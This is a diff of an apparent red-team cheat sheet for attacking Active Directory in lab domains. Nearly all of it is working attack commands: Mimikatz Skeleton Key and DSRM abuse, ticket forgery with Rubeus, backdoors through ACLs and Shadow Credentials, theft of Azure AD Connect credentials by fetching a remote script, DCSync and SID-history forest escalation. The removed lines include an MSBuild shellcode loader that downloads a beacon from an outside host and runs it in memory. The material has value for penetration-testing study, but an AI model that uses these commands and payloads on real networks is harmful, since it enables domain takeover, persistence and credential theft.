+/ticketuser:administrator /domain:us.techcorp.local /dc:US-DC.us.techcorp.local
+/ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show
+/ptt
+
+# Use /tgtdeleg if we have access as domain user and its TGT is already cached
+Rubeus.exe diamond
+/krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
+/tgtdeleg /enctype:aes /ticketuser:administrator /domain:us.techcorp.local
+/dc:US-DC.us.techcorp.local /ticketuserid:500 /groups:512
+/createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+
+#### Skeleton Key
+
+```powershell
+# Once set, Allows any user to Login using 'mimikatz' as password for any useraccount
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName us-dc
+
+# If lsass is running as protected process
+mimikatz # privilege::debug
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # misc::skeleton
+mimikatz # !-
+```
+
+#### DSRM Account
+
+```powershell
+# Directory Services Restore Mode (DSRM), is the local Administrator whose password is configured as SafeModePassword. it is stored in SAM file and not ntds.dat file 
+
+# Dump the local account credentials from sam file (having local DSRM account) 
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computer us-dc
+
+# Adminsitrator hash for DA stored in ntds.dat file can be fetched using below command
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername us-dc
+
+# Login is not allowed by DSRM Account, requires regitry changes
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD
+
+# Login using PTH
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:us-dc /user:Administrator /ntlm:acxs /run"powershell.exe"'
+
+ls \\us-dc\c$
+Enter-PSSession -ComputerName us-dc -Authentication Negotiate
+```
+
+#### Custom SSP
+
+```powershell
+# Custom SSP, once injected in the lsass memory would log the username and password in clear text  
+Invoke-Mimikatz -Command '"misc::memssp"'
+
+# Logs are stored to
+C:\Windows\system32\kiwissp.log
+```
+
+#### Admin SDHolder
+
+```powershell
+# Resides in System Container of domain and maintains permission for Protected Groups
+# Uses Security Descriptor Propagator (SDPROP) every hour and compares the ACL of protected groups & its members with ACL defined in AdminSDHolder and any differences are overwritten
+
+# Set generic all rights to our specified principal 
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser1 -Right All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -verbose
+
+# Other interesting permissions include (ResetPassword, WriteMembers)
+
+# Trigger the SDPropagation
+Invoke-SDPropagator -timeoutMinutes 1 -showProgress -verbose
+
+```
+
+#### ACL Abuse Scenarios
 
 ```powershell
 
-# Enumerate the Domain Trust (Use -Domain attribute to enumerate other domains)
-beacon> powerpick Get-DomainTrust
+>> CASE 1: Modify right on Domain Admins group
+
+# Step 1. Check if one of the pricipals we control has any rights on Domain Admin group
+Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentuserSID"}
+
+# Stp 2.  Above Privilege can be abused by adding members to Domain Admin Group
+Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
+
+>> CASE 2: Exploiting ResetPassword rights on Domain User Account
+
+# Step 1. Change Password of user account if there is any resetpassword rights using powerview
+Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -verbose
+
+>> CASE 3: DCSync rights on user account
+
+# CASE 3.1: Check for presence of DCSync Right to any pricipal in domain
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ObjectAceType -match 'repl' -and $_.SecurityIdentifier -match 'S-1-5-21-210670787-2521448726-163245708'}  | select ObjectDN,  ObjectAceType, SecurityIdentifier
+
+Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuserx"}
+
+# Case 3.2: Assign full rights or DCSync on the domain where we have modify right on user account
+Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser1 -Right All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -verbose
+
+Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser1 -Right DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -verbose
 
 
+>> CASE 4: If there is Generic Write attribute available on Computer Object, then we can use 'RBCD' attack
+>> CASE 5: If there is WriteProperty on User Account, the we can inject 'Shadow credentials' using whishker
 
-## PrivEsc : Child (DEV.CYBERBOTIC.IO) to Parent (CYBERBOTIC.IO) within Same Domain via SID History
-
-# Enumerate basic info required for creating forged ticket
-beacon> powerpick Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
-beacon> powerpick Get-DomainController -Domain cyberbotic.io | select Name
-beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" -Domain cyberbotic.io | select MemberName
-
-# Use Golden Ticket technique
-PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap
-
-# Or, Use Diamond Ticket technique
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
-
-# Inject the ticket
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=
-
-beacon> steal_token 5060
-beacon> run klist
-beacon> ls \\dc-1.cyberbotic.io\c$
-beacon> jump psexec64 dc-1.cyberbotic.io PeerSambhar
-beacon> dcsync cyberbotic.io cyber\krbtgt
-
-
-
-## Exploiting Inbound Trusts (Users in our domain can access resources in foreign domain) 
-
-# We can enumerate the foreign domain with inbound trust
-beacon> powerpick Get-DomainTrust
-beacon> powerpick Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName
-
-# Check if members in current domain are part of any group in foreign domain
-beacon> powerpick Get-DomainForeignGroupMember -Domain dev-studio.com
-beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120
-beacon> powerpick Get-DomainGroupMember -Identity "Studio Admins" | select MemberName
-beacon> powerpick Get-DomainController -Domain dev-studio.com | select Name
-
-# Fetch the AES256 hash of nlamb user identfied in previous steps
-beacon> dcsync dev.cyberbotic.io dev\nlamb
-
-# We can create Inter-Realm TGT for user identified in above steps (/aes256 has users hash)
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4 /nowrap
-
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap
-
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz[...]NPTQ== /nowrap
-
-# Inject the ticket
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=
-
-beacon> steal_token 5060
-beacon> run klist
-beacon> ls \\dc.dev-studio.com\c$
-
-
-
-## Exploiting Outbound Trusts (Users in other domain can access resources in our domain)
-
-# Enumerate the outbound trust (msp.com) in parent domain (cyberbotic.io)
-beacon> powerpick Get-DomainTrust -Domain cyberbotic.io
-
-# Enumerate the TDO to fetch the shared trust key 
-beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection
-
-# To be execute on the DC having outbound trust
-beacon> run hostname 
-beacon> mimikatz lsadump::trust /patch
-
-# OR, Use DCSync to get the ntlm hash of TDO object remotely
-beacon> powerpick Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid
-beacon> mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}
-
-# There is a "trust account" which gets created in trusted domain (msp.com) by the name of trusting domain (CYBER$), it can be impersonated to gain normal user access (/rc4 is the NTLM hash of TDO Object)
-
-beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"
-
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap
-
-# Inject the ticket
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:MSP /username:CYBER$ /password:FakePass /ticket:doIFLz[...snip...]MuaW8=
-
-beacon> steal_token 5060
-beacon> run klist
-beacon> powerpick Get-Domain -Domain msp.org
+>> CASE 6: Enable kerberosting, ASEPRoasting and Delegation if we have write access to user account
+Set-DomainObject -Identity devuser -Set @{serviceprincipalname ='dev/svc'
+Set-DomainObject -Identity devuser -Set @{"msds-allowedtodelegatetoallowedtodelegateto"="ldap/us-dc.us.techcorp.local"}
+Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}
 
 ```
 
-### LAPS
+#### ACL - Security Descriptors
+
+```powershell
+# Assign remote access to non-admin user by modifying the ACL for remote access services as WMI and PSRemoting on specific host. The Security Descriptor in ACLs is made of below syntax:
+# ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
+# A;CI;CCDCLCSWRPWPRCWD;;;SID
+
+- RACE Toolkit can be used for abuse ACL and apply a backdoor for non-admin user access
+
+# Load RACE toolkit
+. C:\AD\Tools\RACE\master\RACE.ps1
+
+# Set backdoor on loal system or specified system (WMI and Powershell)
+Set-RemoteWMI -SamAccountName studentuser1 -Verbose
+Set-RemoteWMI -SamAccountName studentuser1 -ComputerName US-DC -Verbose
+Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Credential Administrator -namespace 'root\cimv2' Verbose
+
+Set-RemotePSRemoting -SamAccountName studentuser1 -Verbose
+Set-RemotePSRemoting -SamAccountName studentuser1 -ComputerName us-dc Verbose
+
+# Remove the permission
+Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Remove
+Set-RemotePSRemoting -SamAccountName studentuser1 -ComputerName us-dc -Remove
+
+# Using RACE or DAMP Toolkit to registry based backdoor
+Add-RemoteRegBackdoor -ComputerName us-dc -Trustee studentuser1 -Verbose
+
+# Set backdoor to retrive Machine Account Hash, Local Account Hash or Cached Credentials remotely
+Get-RemoteMachineAccountHash -ComputerName us-dc Verbose
+Get-RemoteLocalAccountHash -ComputerName us-dc Verbose
+Get-RemoteCachedCredential -ComputerName us-dc Verbose
+```
+
+
+#### Shadow Credentials
+
+```powershell
+# User and Computer where we have write permission, we can inject shadow credentials (certificate in msDS-KeyCredentialLink attribute that which acts alternate credentials). Used by Windows Hello for Bussiness
+
+>> CASE I: Shadow Credentials Attack for User Account 
+
+# Step 1. Identify the User Object having Write/GenricAll permission
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
+
+# Step 2. Login as princiapl having right to modify the properties of target user (RunAs/PTH)
+
+# Step 3. Use Whishker tool to modify the target user account and add cerificate backdoor
+Whisker.exe add /target:support41user
+
+# Step 4. Verify if the certificate has been added to msDS-KeyCredentialLink attribute of target user
+Get-DomainUser -Identity supportXuser
+
+# Step 5. Use Rubeus to inject TGT and fetch NTLM hash of target user
+Rubeus.exe asktgt /user:supportXuser /certificate:xyz== /password:"1337" /domain:us.techcorp.local
+/dc:US DC.us.techcorp.local /getcredentials /show /nowrap /ptt
+
+
+>> CASE II: Shadow Credentials Attack for Machine Account 
+
+# Step 1. Identify the Computer Object having Write/GenricAll permission
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "mgmtadmin"}
+
+# Step 2. Login as princiapl having right to modify the properties of target user (RunAs/PTH)
+C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /run:cmd.exe" "exit"
+
+# Step 3. Use Whishker tool to modify the target user account and add cerificate backdoor
+Whisker.exe add /target:us-helpdesk$
+
+# Step 4. Verify if the certificate has been added to msDS-KeyCredentialLink attribute of target user
+Get-DomainComputer -Identity us-helpdesk
+
+# Step 5. Use Rubeus to inject TGT and fetch NTLM hash of target user
+Rubeus.exe asktgt /user:us-helpdesk$ /certificate:xyz== /password:"1337" /domain:us.techcorp.local
+/dc:US-DC.us.techcorp.local /getcredentials /show /nowrap /ptt
+
+Rubeus.exe s4u /dc:us-dc.us.techcorp.local /ticket:xyz== /impersonateuser:administrator /ptt /self
+/altservice:cifs/us-helpdesk
+```
+
+
+#### Azure AD Connect
 
 ```powershell
 
-# Check for presence of LAPS 
+# Step 1. Identify the AD Connect user account and machine for syncing the hash between On-prem and Azure AD
+Get-DomainUser -Identity MSOL* -Domain techcorp.local | select -ExpandProperty description
 
-# LAPS client installed on local machine
-beacon> ls C:\Program Files\LAPS\CSE
+# Step 2. Get access to the server identified in the description via helpdesk user (admin)
+.\SafetyKatz.exe "sekurlsa::pth /user:helpdeskadmin /domain:us.techcorp.local /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /run:powershell.exe" "exit"
 
-# Computer Object having ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime attribute set
-powerpick Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName
+# Load & execute the ADconnect.ps1 script to fetch the plain text password for MSOL_* user
+iwr http://192.168.100.41:8080/adconnect.ps1 -O adconnect.ps1
+. .\adconnect.ps1
+adconnect
 
-# LAPS configuration deplayed through GPO
-beacon> powerpick Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
+Domain: techcorp.local
+Username: MSOL_16fb75d0227d
+Password: 70&n1{p!Mb7K.C)/USO.a{@m*%.+^230@KAc[+sr}iF>Xv{1!{=/}}3B.T8IW-{)^Wj^zbyOc=Ahi]n=S7K$wAr;sOlb7IFh}!%J.o0}?zQ8]fp&.5w+!!IaRSD@qYf
 
-# Download LAPS configuration
-beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine
+# Open the netonly session for above user 
+runas /netonly /user:MSOL_16fb75d0227d cmd.exe
 
-beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol
-
-# Parse the LAPS GPO Policy file downloaded in previous step 
-PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol
-
-# Identify the principals who have read right to LAPS password
-
-beacon> powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier
-
-beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
-
-# Use Laps Toolkit to identify Groups & Users who can read LAPS password
-beacon> powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
-beacon> powerpick Find-LAPSDelegatedGroups
-beacon> powerpick Find-AdmPwdExtendedRights
-
-# View the LAPS password for given machine (From User Session having required rights)
-beacon> powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd
-beacon> powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
-
-# Use the laps password to gain access
-beacon> make_token .\LapsAdmin 1N3FyjJR5L18za
-beacon> ls \\wkstn-1\c$
-
-# Set Far Future date as expiry (Only machine can set its Password)
-beacon> powerpick Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose
-
-# LAPS Backdoor
-- Modify the AdmPwd.PS.dll and AdmPwd.Utils.dll file located at C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\ location to log the LAPS password everytime it is viewed by the admin user
-
+# Now, perform DCSync attack to fetch the secrets from DC
+C:\AD\Tools\SharpKatz.exe --Command dcsync --User techcorp\administrator --Domain techcorp.local --DomainController techcorp-dc.techcorp.local
 ```
 
-### AppLocker
+
+## Cross Domain Attacks
+
+
+#### Intra-Forest Privilege Escalation (Child [us.techcorp.local] -> Parent [techcorp.local])
+
+##### CASE 1: Using Trusted Domain Object (TDO) + SID Histroy
+
+```powershell
+# Step 1. fetch the Trust Key (Inward) using one of the following method from child DC
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName us-dc
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\techcorp$"'
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName us-dc
+
+# Step 2. Forge Inter-Realm Trust Ticket 
+Invoke-Mimikatz -Command '"kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726 163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:189517f6dde94659c0aacf1674e46765 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"' 
+
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:9fb9e247a02e6fde1631efa7fedce6a2 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
+
+# Step 3. Inject the TGT in memory and Use Rubeus to request TGS for CIFS Service on Parent-DC
+Invoke-Mimikatz -Command '"kerberos::ptt trust_tkt.kirbi"'
+
+# Step 4. Use TGT to fetch TGS for CIFS Servie on Parent DC
+.\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt
+
+# Step 5. Access the service
+ls \\techcorp-dc.techcorp.local\c$
+```
+
+##### CASE 2: Using KRBTGT account hash of Child Domain + SID History
+
+```powershell
+# Step 1. fetch the ntlm hash of krbtgt account in child domain
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
+
+# Step 2. Forge the golden ticket with  Trust key 
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt"'
+
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt" "exit"
+
+# Step 4. Access the service
+ls \\techcorp-dc.techcorp.local\c$
+Enter-PSSession techcorp-dc.techcorp.local
+
+# Alternately, we can use DC group SID (516) for crafting forged ticket and then perform DCSync
+Invoke-Mimikatz -Command '"kerberos::golden /user:us-dc$ /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /groups:516 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-516,S-1-5-9 /ptt"'
+
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\Administrator /domain:techcorp.local"'
+```
+
+
+#### Inter-Forest Attack - Regular Domain Based Attacks
 
 ```powershell
 
-# Enumerate the Applocker policy via GPO
-beacon> powershell Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath
+>> Kerberost Across Forest Trust
+# Note: Enumeration of domain is possible in case of Inound Trust 
+Get-DomainUser -SPN -Domain eu.local | select name, serviceprincipalname
 
-beacon> download \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol
+.\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:C:\AD\Tools\euhashes.txt
 
-PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol
+C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\euhashes.txt
 
-# Enumerate the Applocker policy via Local Windows registry on machine 
-PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
 
-PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"
+>> Constrained Delegation Across Forest Trust
+# Note: Requires access to the user/machine account having Constrained Delegation enabled
 
-# Using powershell on local system
-PS C:\Users\Administrator> $ExecutionContext.SessionState.LanguageMode
-ConstrainedLanguage
+# Step 1.Identofy the user and service where constrained delgation is allowed
+Get-DomainUser -TrustedToAuth -Domain eu.local  | select samaccountname,msds-allowedtodelegateto
 
-# Navigating Laterally via PSEXEC is fine, as service binary is uploaded in C:\Winodws path which is by default whitelisted
+# Step 2. Calculate the NTLM hash from the user password
+.\Rubeus.exe hash /password:Qwerty@123 /domain:eu.local /user:storagesvc
 
-# Find the writable path within C:\winodws to bypass Applocker
-beacon> powershell Get-Acl C:\Windows\Tasks | fl
-```
+# Step 3. Execute S4U attack to fetch the TGS for CIFS service as Admin on EU-DC
+.\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /msdsspn:"time/EU-DC.eu.local" /altservice:CIFS /domain:eu.local /dc:eu-dc.eu.local /ptt
 
-```C#
-# LOLBAS
-# Use MSBuild to execute C# code from a .csproj or .xml file
-# Host http_x64.xprocess.bin via Site Management > Host File
-# Start execution using C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe test.csproj
+# Step 4. Access the service
+ls \\eu-dc.eu.local\c$
 
-<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="MSBuild">
-   <MSBuildTest/>
-  </Target>
-   <UsingTask
-    TaskName="MSBuildTest"
-    TaskFactory="CodeTaskFactory"
-    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
-     <Task>
-      <Code Type="Class" Language="cs">
-        <![CDATA[
 
-            using System;
-            using System.Net;
-            using System.Runtime.InteropServices;
-            using Microsoft.Build.Framework;
-            using Microsoft.Build.Utilities;
+>> Unconstrained Delegation
+#Note: Only works if Two-way trust is enabled with TGT Delegation enabled (disabled by default). There is no way to know if TGT delegation is allowed across forest without logging onto the target forest DC and leverage netdom command or AD Module. We can directly attempt the PrintSpool attack and see if it works!
 
-            public class MSBuildTest :  Task, ITask
-            {
-                public override bool Execute()
-                {
-                    byte[] shellcode;
-                    using (var client = new WebClient())
-                    {
-                        client.BaseAddress = "http://nickelviper.com";
-                        shellcode = client.DownloadData("beacon.bin");
-                    }
-      
-                    var hKernel = LoadLibrary("kernel32.dll");
-                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
-                    var hCt = GetProcAddress(hKernel, "CreateThread");
+# Step 1. Enumerate if TGT Delegation is enabled across forest trust (only possible from target Domain DC)
+netdom trust usvendor.local /domain:techcorp.local /EnableTgtDelegation
 
-                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
-                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);
+# Step 2. Login to machine in current domain having Unconstrained Delegation (us-web)
+.\SafetyKatz.exe "sekurlsa::pth /user:webmaster /domain:us.techcorp.local /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /run:powershell.exe" "exit"
 
-                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
-                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);
+winrs -r:us-web powershell
 
-                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
-                    WaitForSingleObject(t, 0xFFFFFFFF);
+# Step 3. Execute Rubeus to monitor the TGT on us-web
+.\Rubeus.exe monitor /interval:5 /nowrap
 
-                    return true;
-                }
+# Step 4. Trigger PrintSpool attack (form student vm)
+.\MS-RPRN.exe \\euvendor-dc.euvendor.local \\us-web.us.techcorp.local
 
-            [DllImport("kernel32", CharSet = CharSet.Ansi)]
-            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
-    
-            [DllImport("kernel32", CharSet = CharSet.Ansi)]
-            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+# Step 5. Import the ticket in memory
+.\Rubeus ptt /ticket:xyz==
 
-            [DllImport("kernel32")]
-            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-    
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-            }
-
-        ]]>
-      </Code>
-    </Task>
-  </UsingTask>
-</Project>
+# Step 6. Perform DCSync attack
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:administrator /domain:usvendor.local /dc:usvendor-dc.usvendor.local"'
+C:\AD\Tools\SharpKatz.exe --Command dcsync --User techcorp\administrator --Domain techcorp.local --DomainController techcorp-dc.techcorp.local
 
 ```
+
+#### Inter-Forest Attack - SID History enabled (eu->euvendor) ]
 
 ```powershell
 
-# break out of PowerShell Constrained Language Mode by using an unmanaged PowerShell runspace
-beacon> powershell $ExecutionContext.SessionState.LanguageMode
-ConstrainedLanguage
+# Retrive domain trust account hash 
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computer eu-dc.eu.local
+5cc0d1e3f17b532a70d5826843af74e1
 
-beacon> powerpick $ExecutionContext.SessionState.LanguageMode
-FullLanguage
+# Current domain SID
+Get-DomainSid
+S-1-5-21-3657428294-2017276338-1274645009
 
-# Beacon DLL (DLLs are usually not restricted by Applocker due to performance reason)
-C:\Windows\System32\rundll32.exe http_x64.dll,StartW
+# Target Domain SID
+Get-DomainSid -Domain euvendor.local
+S-1-5-21-4066061358-3942393892-617142613
 
+# Group ID which needs to be impersonated as it has RID > 1000
+Get-DomainGroup -Identity Euadmins  -domain euvendor.local
+S-1-5-21-4066061358-3942393892-617142613-1103
+
+# Create Golden Ticket for User having RID> 1000 as any SID <1000 (DA,EA) will be filtered
+Invoke-Mimikatz -Command '"kerberos::golden /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /rc4:5cc0d1e3f17b532a70d5826843af74e1 /user:Administrator /service:krbtgt /target:euvendor.local /ticket:C:\eu_trust_tkt.kirbi"' 
+
+# Request CIFS TGS ticket for share on DC using TGT genereatd above
+C:\Users\Public\Rubeus.exe asktgs /ticket:C:\eu_trust_tkt.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
+
+# Once we have access as the normal user on target domain, we can enumerate for local admin rights on other server in domain as "euvendor-net.euvendor.local" 
+C:\Users\Public\Rubeus.exe asktgs /ticket:C:\eu_trust_tkt.kirbi /service:HTTP/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
+
+# Invoke command using Powershell remoting
+winrs -r:euvendor-net.euvendor.local hostname
+
+Invoke-Command -ScriptBlock {whoami} -ComputerName euvendor-net.euvendor.local -Authentication NegotiateWithImplicitCredential
+
+NOTE: if 'SIDFilteringForestAware' and 'SIDFilteringQuarantined' is set to 'False', then it wont be possible to use forged inter-realm TGT impersonating RID > 1000.
 ```
 
-
-### Data Exfiltration
+#### Inter-Forest Attack - Abusing PAM Trust
 
 ```powershell
 
-# Enumerate Share
-beacon> powerpick Invoke-ShareFinder
-beacon> powerpick Invoke-FileFinder
-beacon> powerpick Get-FileNetServer
